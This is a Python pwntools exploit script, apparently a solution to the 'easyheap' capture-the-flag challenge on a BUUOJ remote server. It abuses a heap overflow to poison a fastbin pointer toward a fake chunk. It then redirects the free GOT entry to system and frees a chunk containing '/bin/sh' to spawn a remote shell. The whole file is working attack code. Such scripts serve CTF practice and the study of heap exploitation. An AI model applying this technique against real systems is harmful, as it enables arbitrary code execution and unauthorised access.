from pwn import *

context.log_level = 'debug'

#p = process('./easyheap')
elf = ELF('easyheap')
free_got = elf.got['free']
system_addr = elf.plt['system']
p = remote('node4.buuoj.cn', 27739)

def alloc(size):
	p.sendlineafter('choice :', '1')
	p.sendlineafter('Size of Heap : ', str(size))
	p.sendafter('Content of heap:', 'a')
	p.recvuntil('Ful')

def edit(index, content):
	p.sendlineafter('choice :', '2')
	p.sendlineafter('Index :', str(index))
	p.sendlineafter('Size of Heap : ', str(len(content)))
	p.sendafter('Content of heap : ', content)
	p.recvuntil('Done !')
	
def delete(index):
	p.sendlineafter('choice :', '3')
	p.sendlineafter('Index :', str(index))
	#p.recvuntil('Done !')
	
alloc(0x60) #0
alloc(0x60) #1

delete(1)

#fxxk, flag path in the program is wrong, we should change the got of free
#payload = b'a' * ( 0x60 + 8 ) + p64( 0x70 + 1 ) + p64(feak_chunk)

magic_addr = elf.sym['magic']
feak_chunk = 0x6020ad
payload = b'a' * ( 0x60 + 8 ) + p64( 0x70 + 1 ) + p64(feak_chunk)

edit(0, payload)
alloc(0x60) #1
edit(1, '/bin/sh\x00')
alloc(0x60) #2

payload = b'a' * (magic_addr - ( feak_chunk + 0x10 ) + 0x20) + p64(free_got)

edit(2, payload)

payload = p64(system_addr)

edit(0, payload)

#gdb.attach(p)
delete(1)

p.interactive()
